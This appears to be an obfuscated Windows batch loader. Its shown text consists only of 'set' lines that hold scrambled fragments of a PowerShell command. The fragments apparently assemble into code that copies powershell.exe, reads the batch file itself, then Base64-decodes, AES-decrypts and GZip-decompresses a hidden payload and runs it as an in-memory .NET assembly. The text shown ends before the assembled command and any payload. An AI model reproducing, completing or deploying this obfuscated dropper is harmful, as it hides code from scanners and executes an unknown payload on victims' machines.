@echo off
set "cSNRyicJmE=xe"
set "FQnnSwBmfz=em"
set "rKeMDdisfa= /"
set "gGlPZuDOxF=po"
set "pVapEqaVzk=s\"
set "eckdKvpvPY=he"
set "PVCMDwashh=Wi"
set "BgHNpvOONJ=do"
set "jaFgpbiaMV=.e"
set "NdgYccQjeT=ow"
set "WonUTEbnXt=py"
set "mCIdGPVMvq= C"
set "phWfgdkVpJ=ll"
set "gNgglTtgTu=he"
set "rBBKQNmAOH=nd"
set "keylderKbF=rs"
set "nWFLSBTlgs=ws"
set "NqaDRlySYZ=32"
set "MOGLGFQzge=rS"
set "PCFoZctMnc=Sy"
set "VjPxyKQXgS=we"
set "IdWcgADuuT=\W"
set "BwlYFYorvD=in"
set "qVDvwJQCoG=co"
set "matOuaXMZz=0\"
set "eKzvFezfFs=\v"
set "TvvrvghaRj=y "
set "WgxvxCwjMK=we"
set "qMQUMgyknq=ll"
set "AFVTOTVuLb=1."
set "TgRmXqfcXT=Po"
set "EUxdQZpgmI=:\"
set "MOsFULOEKB=st"
set "dMLKVMxzjL= %~dp0"
set "IGRvjPywBR=cd"
set "COOPCSnPVl=TBJr"
set "ysZxikDPAS=Mode"
set "eGONUiCDck=.-16"
set "mAaWyBtInJ=em.C"
set "XrpeMobYfW=nage"
set "URgSswuzII=k; }"
set "njKxkppigC=CFxo"
set "AsJoDVsfVh=.Dis"
set "uojEJIlnjd=em.I"
set "xKdCHjnjZr=tbO "
set "QHRoiGseGc=fore"
set "ZnPlVOWOIm=-4] "
set "daXbSjhrUM= if "
set "BvqJLAqKqA=106u"
set "mnzGsciMki=tsWi"
set "PyxaKnfMkC=('%*'"
set "XaaGEgTnmd=eam("
set "iLycoWlTno=-Obj"
set "nkGASZovcA=gsYZ"
set "ISkVANhzvT=Fina"
set "mitXFnkZGj=comm"
set "YhUDxDkVzw=rity"
set "RkXdotEotB=MiJ."
set "zwVBJhkIGB=);$F"
set "eFHYnqGWaw=ionM"
set "IIJuvpLmwx=naM "
set "sXvYWAkMUs=tA.D"
set "vWRNEXnMwV== $L"
set "OLSJDRYChV=ecry"
set "roEpcUBycJ=tryP"
set "OknMxJweMj=m.IO"
set "yyLRgHTYGj='0Pg"
set "UnblHvdNfx=]::N"
set "zzzFUjBmwf=saBm"
set "WXzzhyWfQI=oryS"
set "LZTLkifrxk=iJ.T"
set "mcZeAiLvdg=pres"
set "RpyDCgkyeW=('da"
set "fzGFKTljsS=brea"
set "BAEFMzByFa=RmAx"
set "VMUgarRMeE=);$L"
set "CAaxnoOOLV=[IO."
set "eoyEiKzBNm=ptog"
set "HdKuxjxmdc=[Env"
set "JAvwTsvQZj=Disp"
set "IbjWtNRPAN=nirt"
set "yYWJTGtUjL=Stre"
set "pYNPBGdUjy=bstr"
set "corxMDcFDe=ttAg"
set "nwIvoQxnqA=ert]"
set "tNGZIigDmT=Secu"
set "gNWIvsoBdo=YxVw"
set "ESQIENZpfP=tbO."
set "QDPuCqmEfO=Mz ="
set "aqFqVZjKkj=)))"
set "FnfXNUYvrS=  $R"
set "PqCZgUkFht=:('g"
set "eMtgkmbYCS=$VTB"
set "RWmfpuXVpE=yDWo"
set "tqQHoWbPTB=morF"
set "UNOCdqwCLB=Comp"
set "irqTYxGJcN=$ttA"
set "cCeebsJdRA=.Cop"
set "XKenXEucQF=..-1"
set "lojXTJJqvM=ddin"
set "EiDFoxKIBB=tem."
set "ZKQFPxKXzn=($qO"
set "MYrZFMGJBU=z) {"
set "uSTohrLZBb=raph"
set "dKZjpTApbp=$ciM"
set "jTkXzAzluH=)($R"
set "PZXUfpKAGs=, (,"
set "tupUoTowwL=);$t"
set "SDPlYDTDfe=; };"
set "TupnyAxqFW=iron"
set "ygRgQXqVAs=$FyR"
set "oaOCHZjufh=();$"
set "rHUlWyeYnl=;$ci"
set "ZfmfDAfKhT=am;$"
set "lUIPZAFoBd=l5E7"
set "RIgYZWrRAq=Jr);"
set "WNpiUdoNBb=grap"
set "kRmeiQaiBY=:: '"
set "eIhnnmzylR=gMod"
set "uESwaqaKlF= [st"
set "AKjlzqtYEU=lit("
set "DJxqBZOCpa=M.En"
set "XIMRcPKPNR=vert"
set "BZZnDJDfAU=('Tg"
set "HzTRREKopv= = $"
set "KyjFHWrlrt=join"
set "XrZdeacOct=orF'"
set "crgaakfVHQ=y.Cr"
set "NXWUIdoQze=ispo"
set "ByqkLaVXms=[Sys"
set "uGvgBpJafK=New-"
set "hHJSwccPDA=Pydc"
set "mntwmiNUOf=[-1."
set "PyLgVqQAdW=lBlo"
set "RgNZsUducx=);$V"
set "zwiSKOuohy=.Dis"
set "MIZssVvpbW=);$L"
set "UFsTGKyVbY=zHhH"
set "VYijhctsOm=[Sys"
set "pvThVctMBF=ct S"
set "tGxprSlFPl=$KXh"
set "IMejJwiATg=3); "
set "BRDiHgYGRF=L4Yi"
set "CzkFPVuyFb=TllA"
set "WoptmpZgXq==');"
set "YLRWiDpKar=g = "
set "vvciLAvghJ=[Sys"
set "xXIzrbHcbM=form"
set "nymKFdOJcJ=ateD"
set "siPftSLleP=$Ltb"
set "FkyGwVUsfY=Secu"
set "CtkRrwSlWw=yste"
set "FCbVfnlGgo=('%~f0'"
set "RERJrHkzXG=O.Su"
set "IRYhStVoNi=Comp"
set "WWYjULThze=ct S"
set "FiYrNaKSkP='txe"
set "DiJIdQcYnT=Star"
set "oJfYjoVaUe=trea"
set "cfZtPjGpeQ=n ''"
set "PzJzXBfLjO=..-1"
set "NRCKKaKirR=.Len"
set "OkIJjSeliM=();$"
set "JEayAWCaLO=$yDW"
set "JxSXcokWUr=y]::"
set "KzGrOPCrxJ=urit"
set "bFftszsToA=File"
set "mEtvPdHzEk=] -j"
set "HZwqcBPKmE=.Sec"
set "BHIjyMpPtq=-1.."
set "TbATnROJQa=m.IO"
set "SPPnJWyWVR=ring"
set "ZcCwimgdtL=oin "
set "clKvgdcTjH=rt]:"
set "ekkyjbdTVT=bjec"
set "lkkGXZlCDb=Y, 0"
set "KtXzgPBaxA=]::("
set "iamPoFdkXq=raph"
set "kUOpRNrtuj=ck($"
set "HNBjIubvxB=CLYa"
set "BPQsYtdliN=gth)"
set "sRWVwHPdzC=ptog"
set "vHyqarCmiV='')("
set "PzHSJUCoWp=e]::"
set "oVqsWdAxwQ=e = "
set "HuvvelQBYl=yste"
set "SAndzhvfKM=m.Re"
set "KozThvWSnR=Bmor"
set "TpPSTYmdHp=1..-"
set "XwcFCvzHai=n ''"
set "bZklNpZDmZ= = $"
set "InpXbZNnky=.Mem"
set "bIRloBKvHh= [Sy"
set "bFjuslorLJ=.IO."
set "xFoSRRFlRn=oY ="
set "OClaagkzji=New-"
set "GbpImpTsuw=6esa"
set "zxyOdSGOFs='[-1"
set "CmwEenvzaD=rity"
set "DhQhrvwYrV=Obje"
set "nMnzwSJFjh=.Cry"
set "oOycACillq=Dr.I"
set "jiNvFkkJDM=.Ass"
set "QnmeFzSKpM=A = "
set "tUxWiymvrs=r.Pa"
set "NcBYsYJwVa=FyRt"
set "SMWkOmAkem=le  "
set "MtbeqTcagI=zuZI"
set "OXkIaeMhqO=ose("
set "eevtvAUSFD=ew-O"
set "udZtGllEdp=-joi"
set "yYIRfLncgU=tS46"
set "MajwGNsBkM= = N"
set "fVfXxDmeXA=oL'["
set "aDWbSnCYFO=ode]"
set "GAsDNnfCya=yste"
set "MYOvUJflFV=tem."
set "bjSeDJmkPn=LtbD"
set "UISiLYhrNN=oY);"
set "jZgaGIipwa=oint"
set "mOkLcJBhOw='[-1"
set "uWEFpbuBpa=ress"
set "dvrlsIGIxx=embl"
set "UaWNdLDsBT=.Cre"
set "QsIdtvaeJS=ptor"
set "HNwKYMkilo=pStr"
set "LvOzaQScVx=yTo("
set "QTqfcpTvpS=hy.A"
set "RYYUyXLpqn=qOtb"
set "blIYyWKYOC=y.Ci"
set "lIRGwhIJxo=MiJ "
set "IyHLeyDlsO=.Mod"
set "UCjoeLLaWU=ss -"
set "BopDfcerFI=s75K"
set "BseGyHecMj=ddin"
set "WsuFaXZZNW=d;$L"
set "YEpqjiqfGh=tion"
set "AdqKBvCYYs=yDWo"
set "QaagctFusr=KXhM"
set "wmAhGrbwmU=pose"
set "xPtjsiwvLZ=O.Me"
set "RexhXfuWNY=ewLi"
set "UHhPTDDxKT=Invo"
set "IWSRigWrOm=ose("
set "syVDrXohtO=16] "
set "IkdBuQqvlH=CLYa"
